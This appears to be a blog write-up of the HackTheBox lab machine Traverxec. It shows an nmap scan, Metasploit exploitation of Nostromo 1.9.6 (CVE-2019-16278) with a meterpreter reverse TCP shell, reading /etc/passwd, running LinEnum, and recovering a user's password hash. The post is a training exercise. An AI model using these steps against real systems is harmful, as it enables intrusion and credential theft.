---
layout: post
author: Mariano M
---

---

## Traverxec - 10.10.10.165

This was one of the first machines that I exploited in my beginnings in HackTheBox so lets start.

##### nmap scan

First of all is to do an nmap, to do a scan of open ports, for this step I have used nmap command followed by several options to get better search results. Finally, add -oN "filename.txt" to save the output in a text file for later review.

```console
root@kali:~# nmap -sV -A – v -oN nmap_10.10.10.165 10.10.10.165
# nmap 7.80 scan initiated Wed Mar 25 11:25:01 2020 as: nmap -A -sV -oN HTB/nmap_10.10.10.165 10.10.10.165
Nmap scan report for 10.10.10.165
Host is up (0.052s latency).
Not shown: 998 filtered ports
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey:
| 2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
| 256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
|_ 256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
80/tcp open http nostromo 1.9.6
|_http-server-header: nostromo 1.9.6
|_http-title: TRAVERXEC
...
TRACEROUTE (using port 80/tcp)
HOP RTT ADDRESS
1 52.11 ms 10.10.14.1
2 52.20 ms 10.10.10.165
# Nmap done at Wed Mar 25 11:25:19 2020 -- 1 IP address (1 host up)
scanned in 18.83 seconds
```
Once obtained the result of the nmap scan you can observe that it has the port 22/tcp open with the SSH service in its version 9.7 working, also that it has the port 80 open. It calls my attention that the web server is not that common, it is a Nostromo 1.9.6, which makes me suspect something strange. I save the information and begin to investigate about that web server.

##### Analysis of nosotromo 1.9.6

The next thing we found for this version of nostromo
is that has a vulnerability that was found in Nostromo nhttpd up to 1.9.6 (Web Server) and
classified as critical. The http_verify function is affected by this vulnerability. Through
manipulation as part of HTTP Request leads to a directory vulnerability
traversal. This has an impact on confidentiality, integrity, and availability. The
vulnerability is identified as CVE-2019-16278 and the exploitation is considered easy. By
therefore, I repeat the last process in metasploit, but this time I just look out for nostromo with the search command.

```console
root@kali:~# msfconsole
[-] ***rting the Metasploit Framework console...\
[-] * WARNING: No database support: No database YAML file
[-] ***
=[ metasploit v5.0.80-dev ]
+ -- --=[ 1983 exploits - 1088 auxiliary - 339 post ]
+ -- --=[ 559 payloads - 45 encoders - 10 nops ]
+ -- --=[ 7 evasion ]
Metasploit tip: Enable verbose logging with set VERBOSE true
msf5 > search nostromo

Matching Modules
================

# Name 		Disclosure 		Date 	   Rank
Check Description
- ---- --------------- ---- --
--- -----------
0 exploit/multi/http/nostromo_code_exec 2019-10-20 good
Yes Nostromo Directory Traversal RemoteCommandExecution
```
Lets start using this exploit and modify the options.

```console
msf5 > use exploit/multi/http/nostromo_code_exec
msf5 exploit(multi/http/nostromo_code_exec) > options
Module options (exploit/multi/http/nostromo_code_exec):
Name 	Current Setting Required Description
---- 	--------------- -------- -----------
Proxies no A proxy chain of format
type:host:port[,type:host:port][...]
RHOSTS 		yes 	The target host(s), range CIDR
identifier, or hosts file with syntax 'file:<path>
RPORT 80 	yes 	The target port (TCP)
SRVHOST 0.0.0.0 yes 	The local host to listen on.
This must be anaddress on the local machine or 0.0.0.0
SRVPORT 8080 	yes 	The local port to listen on.
SSL false no Negotiate SSL/TLS for
outgoingconnections
SSLCert 	no 	Path to a custom SSL certificate
(default is randomlygenerated)
URIPATH 	no 	The URI to use for this exploit
(default is random)
VHOST 		no 	HTTP server virtual host

Payload options (cmd/unix/reverse_perl):


Name Current Setting Required Description
---- --------------- -------- -----------
LHOST 		yes 	The listen address (an interface
may be specified)
LPORT 4444 	yes 	The listen port

Exploit target:

Id Name
-- ----
0 Automatic (Unix In-Memory)
```
In this case you only have to put the rhosts in 10.10.10.165 which is the machine to attack and also use the target 1 set.

```console
msf5 exploit(multi/http/nostromo_code_exec) > set rhosts 10.10.10.165
rhosts => 10.10.10.165
msf5 exploit(multi/http/nostromo_code_exec) > set target 1
target => 1
```
Finally, for the exploit to work correctly we have to load a payload to get a reverse console in meterpreter to obtain a remote shell in the victim machine.
For this step we have to use the LHOST which is the ip of the computer where the console is going to be opened, the ip that vpn has given us to be on the same network.

```console
msf5 exploit(multi/http/nostromo_code_exec) > set payloadlinux/x86/meterpreter/reverse_tcp

payload => linux/x86/meterpreter/reverse_tcp

msf5 exploit(multi/http/nostromo_code_exec) > set lhost 10.10.14.238
lhost => 10.10.14.238
```
Now lets run the exploit

```console
msf5 exploit(multi/http/nostromo_code_exec) > exploit

[*] Started reverse TCP handler on 10.10.14.238:4444
[*] ConfiguringAutomatic (Linux Dropper) target
[*] Sendinglinux/x86/meterpreter/reverse_tcpcommandstager
[*] Sendingstage (989416 bytes) to 10.10.10.165
[*] Meterpreter session 1 opened (10.10.14.238:4444 -> 10.10.10.165:37220) at 2020-03-26 20:34:43 +0100
[*] CommandStagerprogress - 100.00% done (763/763 bytes)
meterpreter >
```
We can see that a session has been created, now we are inside the machine. Now open a shell and test any command. 
We can see that we have connected to the machine with the user www-data and
that we are in the /usr/bin folder.

```console
meterpreter > shell
Process 999 created.
Channel 1 created.
whoami
www-data

pwd
/usr/bin
```
Now, we will do a cat on passwd file to find system users.

```console
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
david:x:1000:1000:david,,,:/home/David:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
```

##### execute linenum.sh script and analyze

You can find the LinEnum.sh here: https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh.

Upload the script to the machine with meterpreter.

```console
meterpreter > upload LinEnum.sh
[*] Uploading: LinEnum.sh -> LinEnum.sh
[*] Uploaded 45.54 KiB of 45.54 KiB (100.0%): LinEnum.sh -> LinEnum.sh
[*] upload : LinEnum.sh -&gt; LinEnum.sh
meterpreter >
```

Launch the script and analyze every line.

After reading a lot of lines that the script found on the system, like superusers, crontabs, etc. I have found an .htpasswd file with a password hash of the user David.

```console
[-] htpasswd found - could contain passwords:
/var/nostromo/conf/.htpasswd
David:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
```
